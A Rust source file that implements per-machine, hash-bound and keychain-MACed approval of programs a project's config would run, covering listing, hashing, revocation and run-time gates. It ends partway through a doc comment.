//! Consent to run programs from the project (tsk331, [[tsk162]]).
//!
//! A repo's `.oxplow/project.yaml` can name a program to run: an `exec`
//! collector or report parser, or (in an extension) an `exec` collector. A
//! cloned or pulled repo is untrusted, so none of these run until a person
//! approves the program on this machine. An approval is bound to a hash of
//! what runs (the program's content, plus its args or its network list), so
//! a change needs approving again. Approvals live outside every repo
//! ([`ApprovalStore`]: `<oxplow home>/approvals/`, each entry MACed under a
//! keychain key), per machine: a teammate approves for themselves, a repo
//! can't ship one, and an agent's shell can't forge one. Agents can't
//! approve.
//!
//! See `.context/semantic-layer.md` → "Collectors" and
//! `.context/metrics.md`.

use std::collections::BTreeMap;
use std::path::Path;

use serde::{Deserialize, Serialize};

/// Keychain name of the key approvals are MACed with.
const MAC_KEY_SECRET: &str = "approvals-mac-key";

/// This machine's approvals of one project's programs (tsk344).
///
/// They live outside every repo, in `<oxplow home>/approvals/`, keyed
/// by the canonical project path, so neither a committed file nor an
/// in-tree write grants consent. Each entry also carries an HMAC under
/// a random key kept in the OS keychain, so a process that can write
/// files as the user (an agent's shell) still can't forge one.
pub struct ApprovalStore {
    file: Option<std::path::PathBuf>,
    project: String,
    secrets: std::sync::Arc<dyn oxplow_ai::secrets::SecretStore>,
    /// The MAC key, read from the keychain once per process (an unsigned
    /// dev build re-prompts on every keychain read).
    key: parking_lot::Mutex<Option<Vec<u8>>>,
}

#[derive(Debug, Default, Serialize, Deserialize)]
struct ApprovalFile {
    /// The project these approvals are for (for a person reading it).
    #[serde(default)]
    project: String,
    /// Approval key (`<ext>/<collector>`, or [`ProjectProgram::key`]:
    /// `collector:<id>`, …) → the approved hash and its MAC.
    #[serde(default)]
    approved: BTreeMap<String, Approval>,
    /// When each approval a person revoked was revoked (for a person
    /// reading it; a revoked approval is gone from `approved`, so editing
    /// this grants nothing).
    #[serde(default)]
    revoked: BTreeMap<String, String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct Approval {
    hash: String,
    mac: String,
    /// When it was granted (RFC 3339), for a person reading it.
    #[serde(default)]
    granted_at: Option<String>,
}

impl ApprovalStore {
    /// The store for `project_dir` under the oxplow home (`None` when the
    /// home dir can't be found: then nothing is ever approved).
    pub fn for_project(
        project_dir: &Path,
        secrets: std::sync::Arc<dyn oxplow_ai::secrets::SecretStore>,
    ) -> Self {
        let file =
            oxplow_config::global_config_dir().map(|home| approvals_file(&home, project_dir));
        Self::new(file, project_dir, secrets)
    }

    /// A store at `file` (tests, in-memory services).
    pub fn at(
        file: std::path::PathBuf,
        project_dir: &Path,
        secrets: std::sync::Arc<dyn oxplow_ai::secrets::SecretStore>,
    ) -> Self {
        Self::new(Some(file), project_dir, secrets)
    }

    /// A store that approves nothing (a service built without one).
    pub fn disabled() -> Self {
        Self::new(
            None,
            Path::new(""),
            std::sync::Arc::new(oxplow_ai::secrets::MemorySecrets::default()),
        )
    }

    /// A throwaway store for tests: under `dir`, with an in-memory keychain.
    #[doc(hidden)]
    pub fn for_tests(dir: &Path) -> Self {
        Self::at(
            dir.join(".test-oxplow-home/approvals.json"),
            dir,
            std::sync::Arc::new(oxplow_ai::secrets::MemorySecrets::default()),
        )
    }

    fn new(
        file: Option<std::path::PathBuf>,
        project_dir: &Path,
        secrets: std::sync::Arc<dyn oxplow_ai::secrets::SecretStore>,
    ) -> Self {
        Self {
            file,
            project: canonical(project_dir).to_string_lossy().into_owned(),
            secrets,
            key: parking_lot::Mutex::new(None),
        }
    }

    fn read(&self) -> ApprovalFile {
        self.file
            .as_ref()
            .and_then(|f| std::fs::read_to_string(f).ok())
            .and_then(|t| serde_json::from_str(&t).ok())
            .unwrap_or_default()
    }

    /// The MAC key; created on first approval when `create`.
    fn mac_key(&self, create: bool) -> Option<Vec<u8>> {
        let mut cached = self.key.lock();
        if let Some(k) = cached.as_ref() {
            return Some(k.clone());
        }
        let stored = self.secrets.get(MAC_KEY_SECRET).ok().flatten();
        let key = match stored {
            Some(hex_key) => hex::decode(hex_key).ok()?,
            None if create => {
                let fresh: Vec<u8> = [uuid::Uuid::new_v4(), uuid::Uuid::new_v4()]
                    .iter()
                    .flat_map(|u| u.as_bytes().to_vec())
                    .collect();
                self.secrets
                    .set(MAC_KEY_SECRET, &hex::encode(&fresh))
                    .ok()?;
                fresh
            }
            None => return None,
        };
        *cached = Some(key.clone());
        Some(key)
    }

    fn mac(&self, key: &[u8], approval_key: &str, hash: &str) -> String {
        use hmac::{KeyInit, Mac};
        let Ok(mut m) = hmac::Hmac::<sha2::Sha256>::new_from_slice(key) else {
            return String::new();
        };
        for part in [self.project.as_str(), approval_key, hash] {
            m.update(part.as_bytes());
            m.update(&[0u8]);
        }
        hex::encode(m.finalize().into_bytes())
    }

    /// Whether `key` is approved at exactly `hash`, by this machine.
    pub fn is_approved(&self, key: &str, hash: &str) -> bool {
        let Some(entry) = self.read().approved.get(key).cloned() else {
            return false;
        };
        if entry.hash != hash {
            return false;
        }
        self.mac_key(false)
            .is_some_and(|k| !entry.mac.is_empty() && self.mac(&k, key, hash) == entry.mac)
    }

    /// Re-read consent for a fixed version without borrowing the store.
    /// Revocation affects running work, and a newly approved version
    /// cannot authorize an older invocation.
    pub fn pinned_gate(&self, key: String, hash: String) -> Gate {
        let store = Self {
            file: self.file.clone(),
            project: self.project.clone(),
            secrets: self.secrets.clone(),
            key: parking_lot::Mutex::new(self.key.lock().clone()),
        };
        std::sync::Arc::new(move || {
            if store.is_approved(&key, &hash) {
                Ok(())
            } else {
                Err(format!(
                    "approval of `{key}` was revoked or its version changed"
                ))
            }
        })
    }

    /// Record a person's approval of `key` at `hash`.
    pub fn approve(&self, key: &str, hash: &str) -> std::io::Result<()> {
        let file = self
            .file
            .as_ref()
            .ok_or_else(|| std::io::Error::other("no oxplow home dir to keep approvals in"))?;
        let mac_key = self
            .mac_key(true)
            .ok_or_else(|| std::io::Error::other("the OS keychain is unavailable"))?;
        let mut data = self.read();
        data.project = self.project.clone();
        data.approved.insert(
            key.to_string(),
            Approval {
                hash: hash.to_string(),
                mac: self.mac(&mac_key, key, hash),
                granted_at: Some(oxplow_domain::Timestamp::now().to_string()),
            },
        );
        data.revoked.remove(key);
        self.write(file, &data)
    }

    /// A person revokes `key`'s approval: it holds no more, from the next
    /// thing that asks. `false` when there was none to revoke.
    pub fn revoke(&self, key: &str) -> std::io::Result<bool> {
        let file = self
            .file
            .as_ref()
            .ok_or_else(|| std::io::Error::other("no oxplow home dir to keep approvals in"))?;
        let mut data = self.read();
        if data.approved.remove(key).is_none() {
            return Ok(false);
        }
        data.revoked
            .insert(key.to_string(), oxplow_domain::Timestamp::now().to_string());
        self.write(file, &data)?;
        Ok(true)
    }

    /// When `key` was approved, while it is.
    pub fn granted_at(&self, key: &str) -> Option<String> {
        self.read()
            .approved
            .get(key)
            .and_then(|a| a.granted_at.clone())
    }

    /// When `key`'s approval was revoked, if it was and isn't approved again.
    pub fn revoked_at(&self, key: &str) -> Option<String> {
        self.read().revoked.get(key).cloned()
    }

    fn write(&self, file: &Path, data: &ApprovalFile) -> std::io::Result<()> {
        if let Some(dir) = file.parent() {
            std::fs::create_dir_all(dir)?;
        }
        let text = serde_json::to_string_pretty(data).map_err(std::io::Error::other)?;
        std::fs::write(file, text)
    }
}

fn canonical(p: &Path) -> std::path::PathBuf {
    p.canonicalize().unwrap_or_else(|_| p.to_path_buf())
}

/// `<home>/approvals/<sha256 of the canonical project path>.json`.
pub(crate) fn approvals_file(home: &Path, project_dir: &Path) -> std::path::PathBuf {
    use sha2::{Digest, Sha256};
    let digest = Sha256::digest(canonical(project_dir).to_string_lossy().as_bytes());
    home.join("approvals")
        .join(format!("{}.json", &hex::encode(digest)[..32]))
}

/// What kind of project program it is.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, specta::Type)]
#[serde(rename_all = "lowercase")]
pub enum ProgramKind {
    /// A shared extension's advisories: SQL whose results go into the
    /// agent's context (tsk352). Bundled extensions' aren't gated.
    Advisories,
    /// An extension's provider (`providers:`): a long-lived program
    /// implementing a capability, approved with its declarations.
    Provider,
    /// An extension's effect (`effects:`, P8.D9): a script that reacts to
    /// events by running commands, approved over its extension's folder.
    Effect,
    /// A custom component that declares `commands` (P11, tsk960): a bundle
    /// that may run them with the viewer's rights, approved over its
    /// bundle and the commands it names. One that declares none only shows
    /// and queries, and needs no approval.
    Component,
    /// An AI provider written as a script (`implementations:` with a
    /// `.star` entry): its calls carry the person's key and prompts,
    /// approved over its script and the base URL it sends to — a shipped
    /// one too, so a changed script asks again.
    #[serde(rename = "ai-provider")]
    AiProvider,
    /// An effort policy written as a script (`implementations:` with a
    /// `.star` entry): it composes commands for core's events, as an
    /// effect does, approved over its extension's folder (the manifest's
    /// `needs` says what it reads).
    #[serde(rename = "effort-policy")]
    EffortPolicy,
    /// A declared durable operation; approval covers its declaration and AI use.
    Job,
}

/// A program the project's config would run.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize, specta::Type)]
#[serde(rename_all = "camelCase")]
pub struct ProjectProgram {
    pub kind: ProgramKind,
    /// The capability it implements (a provider): what approving it lets
    /// it do (an agent harness launches the person's agent sessions).
    pub capability: Option<String>,
    /// The collector, agent, extension or component it belongs to.
    pub name: String,
    /// Project-relative path of the program.
    pub program: String,
    pub args: Vec<String>,
    /// The host variables it gets by name (a provider).
    pub env: Vec<String>,
    /// Keychain credentials it gets, by name (a provider).
    pub credentials: Vec<String>,
    /// Hosts it may reach (a provider).
    pub network: Vec<String>,
    /// The commands it may run with the viewer's rights (a component).
    pub commands: Vec<String>,
    /// The scopes it may call (a provider's `needs`).
    pub scopes: Vec<String>,
    /// The project-relative folder whose every file the approval covers
    /// (a provider's extension, declarations included).
    pub tree: Option<String>,
    /// `program` is a url — a server run elsewhere (an MCP server by
    /// `url`) — not a file: the approval covers the url itself, and what
    /// the server is isn't in it.
    pub remote: bool,
    /// This machine approved it as it is now.
    pub approved: bool,
    /// Its approval hash as it is now (`None` when it can't be read). The
    /// person's approve click sends back the version they reviewed.
    pub version: Option<String>,
    /// What approving it grants that this machine can't hold it to
    /// (`grants::gaps`): files a program touches, network off macOS.
    #[serde(default)]
    pub unenforced: Vec<String>,
    /// When this machine approved it, while it is (RFC 3339).
    #[serde(default)]
    pub granted_at: Option<String>,
    /// When a person revoked it, if they did and haven't approved it since.
    #[serde(default)]
    pub revoked_at: Option<String>,
}

impl ProjectProgram {
    pub fn key(&self) -> String {
        match self.kind {
            ProgramKind::Advisories => format!("advisories:{}", self.name),
            ProgramKind::Provider => oxplow_domain::refs::build::of(
                oxplow_domain::contribution::ContributionKind::Provider.segment(),
                &self.name,
            ),
            ProgramKind::Effect => oxplow_domain::refs::build::of(
                oxplow_domain::contribution::ContributionKind::Effect.segment(),
                &self.name,
            ),
            ProgramKind::Component => format!("component:{}", self.name),
            ProgramKind::AiProvider => format!("ai_provider:{}", self.name),
            ProgramKind::EffortPolicy => format!("effort_policy:{}", self.name),
            ProgramKind::Job => oxplow_domain::refs::build::of(
                oxplow_domain::contribution::ContributionKind::Job.segment(),
                &self.name,
            ),
        }
    }

    /// What its approval covers, run from `project_dir` (see [`Self::hash_at`]).
    pub fn hash(&self, project_dir: &Path) -> std::io::Result<String> {
        self.hash_at(project_dir, project_dir)
    }

    /// What its approval covers, as it would run with working dir `cwd`:
    /// - the program's content (when it's a file in the project), and for
    ///   a collector the other files in its directory (a script
    ///   sourcing a helper) unless that directory is the project root;
    /// - every arg, and the content of each arg that names a file under
    ///   `cwd` (the script an interpreter like `node` runs);
    /// - its env.
    ///
    /// A collector names a project file, which must exist.
    pub fn hash_at(&self, project_dir: &Path, cwd: &Path) -> std::io::Result<String> {
        use sha2::{Digest, Sha256};
        // A provider runs in its extension folder: its args name files there.
        let tree_dir = self.tree.as_deref().map(|t| project_dir.join(t));
        let cwd = match (self.kind, &tree_dir) {
            (ProgramKind::Provider, Some(dir)) => dir.as_path(),
            _ => cwd,
        };
        let mut h = Sha256::new();
        match self.kind {
            // Covered by what it says: each advisory is an arg (below).
            ProgramKind::Advisories => h.update(self.program.as_bytes()),
            ProgramKind::Job => {
                h.update(self.program.as_bytes());
                h.update([0u8]);
                h.update(self.files(project_dir)?.bytes("extension.yaml")?);
            }
            // The entry, and every file of its extension but what isn't
            // code it runs (the manifest, whose grants are hashed below,
            // and lenses) — so its declarations file too.
            ProgramKind::Provider => {
                h.update(self.program.as_bytes());
                if self.remote {
                    // No file of its own: the url is what is covered.
                    h.update([6u8]);
                } else {
                    h.update([0u8]);
                    h.update(self.entry_bytes(project_dir)?);
                }
                h.update([2u8]);
                h.update(
                    files_hash(&*self.files(project_dir)?, &|rel| {
                        rel == Path::new("extension.yaml") || rel.starts_with("lenses")
                    })?
                    .as_bytes(),
                );
            }
            // The script, and every file of its extension: the manifest
            // says when and with what it runs. A bundled extension's are
            // its embedded files, hashed alike (tsk953).
            ProgramKind::Effect | ProgramKind::EffortPolicy => {
                h.update(self.program.as_bytes());
                h.update([0u8]);
                h.update(self.entry_bytes(project_dir)?);
                h.update([2u8]);
                h.update(files_hash(&*self.files(project_dir)?, &|_| false)?.as_bytes());
            }
            // The script it runs, read where it lives (a shipped one's is
            // embedded); the base URL it sends to is its `network` (below).
            ProgramKind::AiProvider => {
                h.update(self.program.as_bytes());
                h.update([0u8]);
                h.update(self.entry_bytes(project_dir)?);
            }
            // Its bundle folder as served, read where it is now (tsk984).
            ProgramKind::Component => {
                return self
                    .component_hash(&*crate::extensions::files_at(project_dir, &self.program)?);
            }
        }
        for a in &self.args {
            h.update([0u8]);
            h.update(a.as_bytes());
            let arg_file = cwd.join(a);
            if !matches!(self.kind, ProgramKind::Advisories | ProgramKind::Job)
                && !a.starts_with('-')
                && arg_file.is_file()
            {
                h.update([3u8]);
                h.update(std::fs::read(&arg_file)?);
            }
        }
        for e in &self.env {
            h.update([1u8]);
            h.update(e.as_bytes());
        }
        for c in &self.credentials {
            h.update([4u8]);
            h.update(c.as_bytes());
        }
        for n in &self.network {
            h.update([5u8]);
            h.update(n.as_bytes());
        }
        for c in &self.commands {
            h.update([7u8]);
            h.update(c.as_bytes());
        }
        for c in &self.scopes {
            h.update([8u8]);
            h.update(c.as_bytes());
        }
        Ok(hex::encode(h.finalize()))
    }
}

impl ProjectProgram {
    /// Its extension's files (`tree`), on disk or embedded.
    fn files(
        &self,
        project_dir: &Path,
    ) -> std::io::Result<Box<dyn crate::extensions::ExtensionFiles>> {
        crate::extensions::files_at(project_dir, self.tree.as_deref().unwrap_or_default())
    }

    /// Its entry's text, for a person to read before approving: a bundled
    /// extension's from its embedded files (tsk953).
    pub fn source(&self, project_dir: &Path) -> std::io::Result<String> {
        if self.kind == ProgramKind::Job {
            return Ok(self.args.join("\n"));
        }
        Ok(String::from_utf8_lossy(&self.entry_bytes(project_dir)?).into_owned())
    }

    /// Its entry's bytes: a file of its extension when it's under `tree`
    /// (a bundled one's is embedded), else a project file.
    fn entry_bytes(&self, project_dir: &Path) -> std::io::Result<Vec<u8>> {
        use crate::extensions::ExtensionFiles;
        match self.in_tree() {
            Some(rel) => self.files(project_dir)?.bytes(rel),
            None => crate::extensions::Disk(project_dir.to_path_buf()).bytes(&self.program),
        }
    }

    /// A component's approval hash over `files`, its bundle folder's files
    /// (tsk984): its folder's path, every file of it — the code the frame
    /// runs — and the commands it may run. The same whether the files are
    /// read from disk for Programs or held in the snapshot a frame is
    /// served from ([`crate::component_bundles`]), so a frame's version is
    /// what an approval names.
    pub(crate) fn component_hash(
        &self,
        files: &dyn crate::extensions::ExtensionFiles,
    ) -> std::io::Result<String> {
        use sha2::{Digest, Sha256};
        let mut h = Sha256::new();
        h.update(self.program.as_bytes());
        h.update([2u8]);
        h.update(files_hash(files, &|_| false)?.as_bytes());
        for c in &self.commands {
            h.update([7u8]);
            h.update(c.as_bytes());
        }
        for asset in &self.scopes {
            h.update([8u8]);
            h.update(asset.as_bytes());
        }
        Ok(hex::encode(h.finalize()))
    }

    /// `program` relative to its extension's folder, when it's in it.
    fn in_tree(&self) -> Option<&str> {
        self.tree.as_deref().and_then(|tree| {
            self.program
                .strip_prefix(tree.trim_end_matches('/'))
                .and_then(|rest| rest.strip_prefix('/'))
        })
    }
}

/// Most files and bytes [`tree_hash`] covers; a bigger directory can't be
/// approved as a whole (move the script into its own directory).
pub(crate) const TREE_MAX_FILES: usize = 500;
pub(crate) const TREE_MAX_BYTES: u64 = 16 * 1024 * 1024;

/// SHA-256 over every file under `dir` (relative path + content, sorted),
/// dot-files included (only macOS's `.DS_Store` noise is left out). A
/// symlink anywhere in it is an error: its target isn't what was
/// approved. What an approval of a script's directory covers: change any
/// helper and it needs approving again.
pub fn tree_hash(dir: &Path) -> std::io::Result<String> {
    tree_hash_except(dir, &|_| false)
}

/// [`tree_hash`] leaving out files whose path relative to `dir` `skip`
/// accepts.
pub fn tree_hash_except(dir: &Path, skip: &dyn Fn(&Path) -> bool) -> std::io::Result<String> {
    files_hash(&crate::extensions::Disk(dir.to_path_buf()), skip)
}

/// SHA-256 over an extension's files (relative path + content, in path
/// order), leaving out those `skip` accepts — alike for a folder on disk
/// and a bundled extension's embedded copy of the same files (tsk953).
pub(crate) fn files_hash(
    files: &dyn crate::extensions::ExtensionFiles,
    skip: &dyn Fn(&Path) -> bool,
) -> std::io::Result<String> {
    use sha2::{Digest, Sha256};
    let mut paths: Vec<String> = files
        .paths()?
        .into_iter()
        .filter(|rel| !skip(Path::new(rel)))
        .collect();
    // Path order, component by component (`a/b` before `a-b/x`), as the
    // disk walk always sorted: the digests people approved against.
    paths.sort_by(|a, b| Path::new(a).cmp(Path::new(b)));
    if paths.len() > TREE_MAX_FILES {
        return Err(std::io::Error::other(format!(
            "more than {TREE_MAX_FILES} files to approve; give the program its own directory"
        )));
    }
    let mut h = Sha256::new();
    let mut total = 0u64;
    for rel in paths {
        let bytes = files.bytes(&rel)?;
        total += bytes.len() as u64;
        if total > TREE_MAX_BYTES {
            return Err(std::io::Error::other(
                "too large to approve as a whole; give the program its own directory",
            ));
        }
        h.update(rel.as_bytes());
        h.update([0u8]);
        h.update(&bytes);
        h.update([0u8]);
    }
    Ok(hex::encode(h.finalize()))
}

/// Whether `p` is approved on this machine as it is now.
fn approved_now(store: &ApprovalStore, project_dir: &Path, p: &ProjectProgram) -> bool {
    approved_at(store, project_dir, project_dir, p)
}

/// Whether `p`, run with working dir `cwd`, is what was approved.
/// An AI provider written as a script, as a program to approve: its
/// script (`entry`, in the extension at `tree`) and the base URL it
/// sends to by default.
pub fn ai_provider_program(
    tree: &str,
    extension: &str,
    id: &str,
    entry: &str,
    base_url: Option<&str>,
) -> ProjectProgram {
    let tree = tree.trim_end_matches('/');
    ProjectProgram {
        kind: ProgramKind::AiProvider,
        capability: None,
        name: format!("{extension}/{id}"),
        program: format!("{tree}/{entry}"),
        args: Vec::new(),
        env: Vec::new(),
        credentials: Vec::new(),
        network: base_url.map(str::to_string).into_iter().collect(),
        commands: Vec::new(),
        scopes: Vec::new(),
        tree: Some(tree.to_string()),
        remote: false,
        approved: false,
        version: None,
        unenforced: Vec::new(),
        granted_at: None,
        revoked_at: None,
    }
}

/// Whether a person on this machine approved `program` as it is now.
pub fn is_program_approved(
    store: &ApprovalStore,
    project_dir: &Path,
    program: &ProjectProgram,
) -> bool {
    approved_at(store, project_dir, project_dir, program)
}

fn approved_at(store: &ApprovalStore, project_dir: &Path, cwd: &Path, p: &ProjectProgram) -> bool {
    p.hash_at(project_dir, cwd)
        .is_ok_and(|h| store.is_approved(&p.key(), &h))
}

/// A shared extension's advisories as a program to approve: each
/// advisory (its id, trigger, repeat rule, audience, heading and query) is an arg,
/// so the person reads exactly what may speak into the agent's context
/// and any change needs approving again.
pub fn advisory_program(ext: &crate::extensions::Extension) -> ProjectProgram {
    let text = |v: serde_json::Value| v.as_str().unwrap_or_default().to_string();
    ProjectProgram {
        kind: ProgramKind::Advisories,
        capability: None,
        name: ext.name.clone(),
        program: format!("{}/extension.yaml", ext.path.trim_end_matches('/')),
        args: ext
            .advisories
            .iter()
            .map(|a| {
                format!(
                    "{} (on {}, once per {}{}{}): {}",
                    a.id,
                    text(serde_json::to_value(a.on).unwrap_or_default()),
                    text(serde_json::to_value(a.once_per).unwrap_or_default()),
                    match a.audience {
                        crate::extensions::AdvisoryAudience::Agent => "",
                        crate::extensions::AdvisoryAudience::Person => ", to the person",
                    },
                    a.heading
                        .as_deref()
                        .map(|h| format!(", heading {h:?}"))
                        .unwrap_or_default(),
                    a.query.trim()
                )
            })
            .collect(),
        env: Vec::new(),
        credentials: Vec::new(),
        network: Vec::new(),
        commands: Vec::new(),
        scopes: Vec::new(),
        tree: None,
        remote: false,
        approved: false,
        version: None,
        unenforced: Vec::new(),
        granted_at: None,
        revoked_at: None,
    }
}

/// An extension's provider as a program to approve: its entry, args,
/// env names, credentials and network, over the extension folder's files
/// (declarations included).
pub fn provider_program(
    ext: &crate::extensions::Extension,
    spec: &crate::providers::ProviderSpec,
) -> ProjectProgram {
    let dir = ext.path.trim_end_matches('/');
    let (program, args) = spec.program();
    // An adapter's mapping and pinned tools are files of the folder (the
    // tree hash covers them); naming them here also pins which they are.
    let args = match &spec.adapter {
        Some(a) => {
            // A server by url: which credential is its bearer token.
            let auth = match &a.mcp {
                crate::providers::spec::McpServer::Url {
                    auth: Some(name), ..
                } => vec!["--auth-env".to_string(), name.clone()],
                _ => Vec::new(),
            };
            [a.mapping.clone(), a.tools.clone()]
                .into_iter()
                .chain(args)
                .chain(auth)
                .collect()
        }
        None => args,
    };
    let remote = spec.is_remote();
    ProjectProgram {
        kind: ProgramKind::Provider,
        capability: Some(spec.capability.clone()),
        name: spec.approval_name(&ext.name),
        program: if remote {
            program
        } else {
            format!("{dir}/{program}")
        },
        remote,
        args,
        env: spec.env.clone(),
        credentials: spec.credential_grants(),
        network: spec.network.clone(),
        commands: Vec::new(),
        scopes: spec.needs.clone(),
        tree: Some(dir.to_string()),
        approved: false,
        version: None,
        unenforced: Vec::new(),
        granted_at: None,
        revoked_at: None,
    }
}

/// A custom component as a program: its bundle folder (`program`, the
/// extension's path joined with the manifest's `bundle`, as the folder is
/// served) and the commands it may run. Only one that declares commands is
/// listed to approve — one that declares none only shows and queries — but
/// every component has this shape, which its bundle's version is hashed
/// from ([`crate::component_bundles`]).
pub fn component_program(
    ext: &crate::extensions::Extension,
    component: &crate::extensions::custom_components::CustomComponent,
) -> ProjectProgram {
    let dir = ext.path.trim_end_matches('/');
    ProjectProgram {
        kind: ProgramKind::Component,
        capability: None,
        name: format!("{}/{}", ext.name, component.id),
        program: format!("{dir}/{}", component.bundle.trim_end_matches('/')),
        args: Vec::new(),
        env: Vec::new(),
        credentials: Vec::new(),
        network: Vec::new(),
        commands: component.commands.clone(),
        scopes: component
            .assets
            .iter()
            .map(|asset| oxplow_domain::refs::build::lens_ref(asset))
            .collect(),
        tree: Some(dir.to_string()),
        remote: false,
        approved: false,
        version: None,
        unenforced: Vec::new(),
        granted_at: None,
        revoked_at: None,
    }
}

/// A job has no arbitrary executable. Its reviewed manifest and operation
/// declaration cover its fixed host service grants; request payloads never
/// become approval metadata.
pub fn job_program(
    ext: &crate::extensions::Extension,
    job: &crate::extensions::jobs::JobDecl,
) -> ProjectProgram {
    ProjectProgram {
        kind: ProgramKind::Job,
        capability: None,
        name: format!("{}/{}", ext.name, job.id),
        program: job.operation.as_str().into(),
        args: vec![serde_json::to_string(job).expect("job declaration serializes")],
        env: Vec::new(),
        credentials: Vec::new(),
        network: Vec::new(),
        // The commands its model may call.
        commands: job.tools.iter().map(|tool| tool.command.clone()).collect(),
        scopes: job.needs.clone(),
        tree: Some(ext.path.trim_end_matches('/').into()),
        remote: false,
        approved: false,
        version: None,
        unenforced: Vec::new(),
        granted_at: None,
        revoked_at: None,
    }
}

/// Whether an extension's provider may start: approved as it is now.
pub fn may_run_provider(
    store: &ApprovalStore,
    project_dir: &Path,
    ext: &crate::extensions::Extension,
    spec: &crate::providers::ProviderSpec,
) -> bool {
    // The listing hashes it the same way; its files are the tree's.
    approved_now(store, project_dir, &provider_program(ext, spec))
}

/// Extensions whose advisories need a person's approval: enabled,
/// shared (not bundled with oxplow) and declaring some.
pub fn gated_advisories(
    extensions: &[crate::extensions::Extension],
) -> impl Iterator<Item = &crate::extensions::Extension> {
    extensions
        .iter()
        .filter(|e| e.enabled && e.origin != "bundled" && !e.advisories.is_empty())
}

/// Whether a script may run now, asked before each run: `Err` says why
/// not, for the person reading it.
pub type Gate = std::sync::Arc<dyn Fn() -> Result<(), String> + Send + Sync>;

/// [`Gate`] for a script `program` (an AI provider's, an effort
/// policy's): approved on this machine as it is now, checked on every
/// call — the approvals file is read each time, as an effect's is — so
/// approving takes effect at once and an edit stops it.
pub fn script_gate(
    approvals: std::sync::Arc<ApprovalStore>,
    project_dir: std::path::PathBuf,
    program: ProjectProgram,
) -> Gate {
    let hash = program.hash_at(&project_dir, &project_dir).ok();
    std::sync::Arc::new(move || {
        if hash.as_ref().is_some_and(|pinned| {
            program
                .hash_at(&project_dir, &project_dir)
                .is_ok_and(|current| current == *pinned)
                && approvals.is_approved(&program.key(), pinned)
        }) {
            Ok(())
        } else {
            Err(format!(
                "{} `{}` is a script nobody on this machine approved as it is now; read and \
                 approve it in Settings → Data → Programs",
                kind_title(program.kind),
                program.name
            ))
        }
    })
}

/// How a person names a program of `kind`, at the start of a sentence.
fn kind_title(kind: ProgramKind) -> &'static str {
    match kind {
        ProgramKind::Advisories => "Extension advisories",
        ProgramKind::Provider => "Provider",
        ProgramKind::Effect => "Effect",
        ProgramKind::Component => "Component",
        ProgramKind::AiProvider => "AI provider",
        ProgramKind::EffortPolicy => "Effort policy",
        ProgramKind::Job => "Job",
    }
}

/// An effort policy written as a script, as a program to approve: its
/// script (`entry`, in the extension at `tree`) over every file of the
/// extension, and the scopes it calls (`needs`).
pub fn effort_policy_program(
    tree: &str,
    extension: &str,
    id: &str,
    entry: &str,
    needs: &[String],
) -> ProjectProgram {
    let tree = tree.trim_end_matches('/');
    ProjectProgram {
        kind: ProgramKind::EffortPolicy,
        capability: None,
        name: format!("{extension}/{id}"),
        program: format!("{tree}/{entry}"),
        args: Vec::new(),
        env: Vec::new(),
        credentials: Vec::new(),
        network: Vec::new(),
        commands: Vec::new(),
        scopes: needs.to_vec(),
        tree: Some(tree.to_string()),
        remote: false,
        approved: false,
        version: None,
        unenforced: Vec::new(),
        granted_at: None,
        revoked_at: None,
    }
}

/// Why an unapproved program didn't run, for logs and errors.
pub fn needs_approval(kind: ProgramKind, name: &str, program: &str) -> String {
    let what = match kind {
        ProgramKind::Advisories => "extension advisories",
        ProgramKind::Provider => "provider",
        ProgramKind::Effect => "effect",
        ProgramKind::Component => "component",
        ProgramKind::AiProvider => "AI provider",
        ProgramKind::EffortPolicy => "effort policy",
        ProgramKind::Job => "job",
    };
    format!(
        "{what} `{name}` runs `{program}` from the project's config and needs a person's approval first \
         (Settings → Data → Programs). Approval is per machine and per version of the program and its args."
    )
}

/// Every program the project's config and its extensions run that a person
/// approves here (advisories, providers, effects, …), with
/// whether it's approved.
pub fn list(
    store: &ApprovalStore,
    project_dir: &Path,
    extensions: &[crate::extensions::Extension],
) -> Vec<ProjectProgram> {
    let mut out = Vec::new();
    out.extend(gated_advisories(extensions).map(advisory_program));
    out.extend(extensions.iter().filter(|e| e.enabled).flat_map(|e| {
        e.providers
            .iter()
            .map(move |spec| provider_program(e, spec))
    }));
    out.extend(extensions.iter().filter(|e| e.enabled).flat_map(|e| {
        e.effects
            .iter()
            .map(move |decl| crate::effects::effect_program(e, decl))
    }));
    out.extend(
        extensions
            .iter()
            .filter(|extension| extension.enabled)
            .flat_map(|extension| {
                extension
                    .jobs
                    .iter()
                    .map(move |job| job_program(extension, job))
            }),
    );
    out.extend(extensions.iter().filter(|e| e.enabled).flat_map(|e| {
        e.implementations
            .iter()
            .filter(|d| d.script.is_some())
            .filter_map(move |d| match d.capability.as_str() {
                "ai_provider" => Some(ai_provider_program(
                    &e.path,
                    &e.name,
                    &d.id,
                    &d.entry,
                    d.config.get("baseUrl").and_then(serde_json::Value::as_str),
                )),
                "effort_policy" => Some(effort_policy_program(
                    &e.path, &e.name, &d.id, &d.entry, &d.needs,
                )),
                _ => None,
            })
    }));
    out.extend(extensions.iter().filter(|e| e.enabled).flat_map(|e| {
        e.custom_components
            .iter()
            .filter(|c| !c.commands.is_empty())
            .map(move |c| component_program(e, c))
    }));
    for p in &mut out {
        p.version = p.hash(project_dir).ok();
        p.approved = p
            .version
            .as_ref()
            .is_some_and(|h| store.is_approved(&p.key(), h));
        p.unenforced = crate::grants::gaps(&crate::grants::program_request(p));
        p.granted_at = store.granted_at(&p.key()).filter(|_| p.approved);
        p.revoked_at = store.revoked_at(&p.key());
    }
    out
}

/// The version of `kind`/`name` a listing would show now (tests; the UI
/// reads it from [`list`]).
#[doc(hidden)]
pub fn version_of(
    store: &ApprovalStore,
    project_dir: &Path,
    kind: ProgramKind,
    name: &str,
) -> String {
    list(store, project_dir, &[])
        .into_iter()
        .find(|p| p.kind == kind && p.name == name)
        .and_then(|p| p.version)
        .unwrap_or_default()
}

/// A cached script cannot acquire a changed script's newly approved hash.
pub fn loaded_script_gate(
    approvals: std::sync::Arc<ApprovalStore>,
    project_dir: std::path::PathBuf,
    program: ProjectProgram,
    loaded: String,
) -> Gate {
    let live = script_gate(approvals, project_dir.clone(), program.clone());
    std::sync::Arc::new(move || {
        if !program
            .entry_bytes(&project_dir)
            .is_ok_and(|bytes| bytes == loaded.as_bytes())
        {
            return Err("the loaded script differs from the approved version; reload it".into());
        }
        live()
    })
}

/// A person revokes `kind`/`name`'s approval on this machine: from the
